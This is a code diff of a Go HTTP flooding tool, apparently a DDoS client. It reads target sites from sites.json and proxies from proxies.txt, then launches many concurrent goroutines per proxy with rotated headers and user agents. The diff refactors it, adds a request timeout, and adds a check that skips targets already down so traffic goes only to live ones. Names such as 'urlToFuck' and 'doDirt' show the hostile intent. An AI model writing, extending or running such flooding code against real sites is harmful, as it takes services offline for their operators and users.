@@ -19,8 +19,7 @@ import (
 )
 
 var (
-	ShowErrors = false
-	acceptall  = []string{
+	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8f|Accept-Language: en-US,en;q=0.5f|Accept-Encoding: gzip, deflatef",
 		"Accept-Encoding: gzip, deflatef",
 		"Accept-Language: en-US,en;q=0.5f|Accept-Encoding: gzip, deflatef",
@@ -70,12 +69,15 @@ var (
 	}
 )
 
-var GetHostsUrl = ""
+var (
+	GetHostsUrl      = ""
+	ProxyApiLogin    = ""
+	ProxyApiPassword = ""
+	GourutinesCount  = 1
+	ShowErrors       = false
+)
 
-var ProxyApiLogin = ""
-var ProxyApiPassword = ""
-
-var GourutinesCount = 1
+const REQUEST_TIMEOUT = 15
 
 type UrlAndProxy struct {
 	Site  Site    `json:"site"`
@@ -108,7 +110,7 @@ func main() {
 	ProxyApiLogin = os.Getenv("PROXY_LOGIN")
 	ProxyApiPassword = os.Getenv("PROXY_PASSWORD")
 	GourutinesCount, _ = strconv.Atoi(os.Getenv("GOURUTINES_COUNT"))
-
+	ShowErrors, _ = strconv.ParseBool(os.Getenv("SHOW_ERRORS"))
 	argsWithoutProg := os.Args[1:]
 
 	urlAndProxy := new(UrlAndProxy)
@@ -118,7 +120,6 @@ func main() {
 				doDirt()
 			}
 		}
-		//@todo count of goroutines from args
 	}
 
 	for {
@@ -150,7 +151,7 @@ func main() {
 		fmt.Println("URL - " + urlToFuck)
 		// fmt.Println("Go f**k them!")
 		for _, proxy := range urlAndProxy.Proxy {
-			for i := 0; i < GourutinesCount; i++ { // @todo count of goroutines from args
+			for i := 0; i < GourutinesCount; i++ {
 				time.Sleep(time.Microsecond * 100)
 				wg.Add(1)
 				go sendRequest(urlToFuck, &proxy, &wg)
@@ -166,16 +167,49 @@ func doDirt() {
 	var siteUrls []string
 	var proxyUrls []string
 
+	siteUrls = getSitesUrl()
+	proxyUrls = getProxyUrls()
+
+	for _, urlToFuck := range siteUrls {
+		if !checkUrl(urlToFuck, proxyUrls) {
+			continue
+		}
+		var wg sync.WaitGroup //@todo mb move upper
+		for k, proxyUrl := range proxyUrls {
+			proxyOb := new(Proxy)
+			proxyOb.Id = k
+			proxyOb.Ip = proxyUrl
+			proxyOb.Auth = ProxyApiLogin + ":" + ProxyApiPassword
+
+			for i := 0; i < GourutinesCount; i++ {
+				time.Sleep(time.Millisecond * 100)
+				wg.Add(1)
+				go sendRequest(urlToFuck, proxyOb, &wg)
+			}
+		}
+		wg.Wait()
+	}
+}
+
+func getSitesUrl() []string {
+	var siteUrls []string
 	siteUrlsFile, err := os.Open("sites.json")
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(0)
 	}
-	fmt.Println("Successfully parsed sites.json")
+
 	defer siteUrlsFile.Close()
 
 	siteUrlsData, _ := ioutil.ReadAll(siteUrlsFile)
 	json.Unmarshal([]byte(siteUrlsData), &siteUrls)
+
+	fmt.Println("Successfully parsed sites.json")
+	return siteUrls
+}
+
+func getProxyUrls() []string {
+	var proxyUrls []string
 
 	proxiesFile, err := os.Open("proxies.txt")
 	if err != nil {
@@ -189,26 +223,51 @@ func doDirt() {
 
 	fmt.Println("Successfully parsed proxies.txt")
 
-	for _, urlToFuck := range siteUrls {
-		fmt.Println("URL - " + urlToFuck)
-		var wg sync.WaitGroup //@todo mb move upper
-		for k, proxyUrl := range proxyUrls {
-			proxyOb := new(Proxy)
-			proxyOb.Id = k
-			proxyOb.Ip = proxyUrl
-			proxyOb.Auth = ProxyApiLogin + ":" + ProxyApiPassword
+	return proxyUrls
+}
 
-			for i := 0; i < GourutinesCount; i++ {
-				time.Sleep(time.Millisecond * 100)
-				wg.Add(1)
-				go sendRequest(urlToFuck, proxyOb, &wg)
-				os.Stdout.Sync()
-			}
+func checkUrl(urlToFuck string, proxyUrls []string) bool {
+	u, err := url.Parse(urlToFuck)
+	if err != nil {
+		if ShowErrors {
+			fmt.Println(err)
 		}
-		wg.Wait()
+		return false
 	}
 
+	if u.Scheme == "" {
+		urlToFuck = "http://" + urlToFuck
+	}
+
+	fmt.Println("Checking url " + urlToFuck + "...")
+	if isSiteDown(urlToFuck, proxyUrls) {
+		fmt.Println("Bad url - continue")
+		return false
+	}
+	fmt.Println("Good url! Starting...")
+	return true
 }
+
+func isSiteDown(urlToFuck string, proxyUrls []string) bool {
+	countBad := 0
+	var wg sync.WaitGroup
+	for i := 0; i < 5; i++ {
+		randProxy := proxyUrls[rand.Intn(len(proxyUrls))]
+		proxyOb := new(Proxy)
+		proxyOb.Id = i
+		proxyOb.Ip = randProxy
+		proxyOb.Auth = ProxyApiLogin + ":" + ProxyApiPassword
+
+		wg.Add(1)
+		if !sendRequest(urlToFuck, proxyOb, &wg) {
+			countBad++
+		}
+	}
+
+	return countBad > 3
+}
+
+// @todo deprecated
 func getApiData(url string) ([]byte, error) {
 	resp, err := http.Get(url)
 
@@ -229,6 +288,7 @@ func getApiData(url string) ([]byte, error) {
 	return data, nil
 }
 
+// @todo deprecated
 func getInitData() ([]byte, error) {
 	url := GetHostsUrl
 
@@ -249,24 +309,16 @@ func getInitData() ([]byte, error) {
 	return data, nil
 }
 
-func sendRequest(urlToFuck string, proxyConf *Proxy, wg *sync.WaitGroup) {
+func sendRequest(urlToFuck string, proxyConf *Proxy, wg *sync.WaitGroup) bool {
 	defer wg.Done()
-
-	u, err := url.Parse(urlToFuck)
-	if err != nil {
-		// fmt.Println(err)
-		return
-	}
-
-	if u.Scheme == "" {
-		urlToFuck = "http://" + urlToFuck
-	}
-
 	var proxy = "http://" + proxyConf.Auth + "@" + strings.TrimSuffix(proxyConf.Ip, "\r")
 
 	proxyURL, err := url.Parse(proxy)
 	if err != nil {
-		log.Println(err)
+		if ShowErrors {
+			log.Println(err)
+		}
+		return false
 	}
 
 	transport := &http.Transport{
@@ -275,15 +327,17 @@ func sendRequest(urlToFuck string, proxyConf *Proxy, wg *sync.WaitGroup) {
 
 	client := &http.Client{
 		Transport: transport,
-		// Timeout:   time.Second * 15,
+		Timeout:   time.Second * REQUEST_TIMEOUT, //@todo think about enabling that
 	}
 
 	currentTime := time.Now()
 
 	request, err := http.NewRequest("GET", urlToFuck, nil)
 	if err != nil {
-		// fmt.Println(currentTime.Format("15:04:05"), " | Bad request: "+err.Error()+" | 0")
-		return
+		if ShowErrors {
+			fmt.Println(currentTime.Format("15:04:05"), " | Bad request: "+err.Error()+" | 0")
+		}
+		return false
 	}
 
 	request.Header = http.Header{
@@ -298,17 +352,22 @@ func sendRequest(urlToFuck string, proxyConf *Proxy, wg *sync.WaitGroup) {
 
 	response, err := client.Do(request)
 	if err != nil {
-		// fmt.Println(currentTime.Format("15:04:05"), " | Bad response: "+err.Error()+" | 0")
-		return
+		if ShowErrors {
+			fmt.Println(currentTime.Format("15:04:05"), " | Bad response: "+err.Error()+" | 0")
+		}
+		return false
 	}
 	defer response.Body.Close()
 
 	if (response.StatusCode < http.StatusOK) || (response.StatusCode > http.StatusFound) {
-		// fmt.Println("Bad response: " + strconv.Itoa(response.StatusCode))
-		return
+		if ShowErrors {
+			fmt.Println("Bad response: " + strconv.Itoa(response.StatusCode))
+		}
+		return false
 	}
 
 	fmt.Println(currentTime.Format("15:04:05"), " | Response OK | ", response.StatusCode)
+	return true
 }
 
 func getuseragent() string {
@@ -342,7 +401,9 @@ func getuseragent() string {
 	return spider[rand.Intn(len(spider))]
 }
 
-func contain(char string, x string) int { //simple compare
+// @todo deprecated
+
+func contain(char string, x string) int {
 	times := 0
 	ans := 0
 	for i := 0; i < len(char); i++ {
